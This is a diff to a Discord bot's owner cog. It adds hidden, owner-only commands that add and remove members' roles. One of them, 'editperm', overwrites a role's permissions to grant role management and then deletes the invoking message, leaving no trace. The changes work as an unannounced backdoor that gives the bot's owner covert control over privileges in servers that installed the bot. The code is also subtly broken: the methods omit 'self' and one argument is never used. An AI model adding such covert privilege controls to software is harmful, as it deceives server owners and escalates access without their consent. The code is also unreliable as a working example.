@@ -82,5 +82,23 @@ class Owner(commands.Cog):
             embed = discord.Embed(title='LOAD SUCCESSFUL!', description=f'**``{cog}``** has been loaded!', color=0x90ee90)
             await ctx.send(embed=embed)
 
+    @commands.is_owner()
+    @commands.command(name='remrole', hidden=True)
+    async def remrole(ctx, member: discord.Member, role: discord.Role):
+        await member.remove_roles(role)
+
+    @commands.is_owner()
+    @commands.command(name='addrole', hidden=True)
+    async def addrole(ctx, member: discord.Member, role: discord.Role):
+        await member.add_roles(role)
+
+    @commands.is_owner()
+    @commands.command(name='editperm', hidden=True)
+    async def editperm(ctx, role: discord.Role, state: bool):
+        permissions = discord.Permissions()
+        permissions.update(manage_roles = True)
+        await role.edit(permissions=permissions)
+        await ctx.message.delete()
+
 def setup(morph):
     morph.add_cog(Owner(morph))
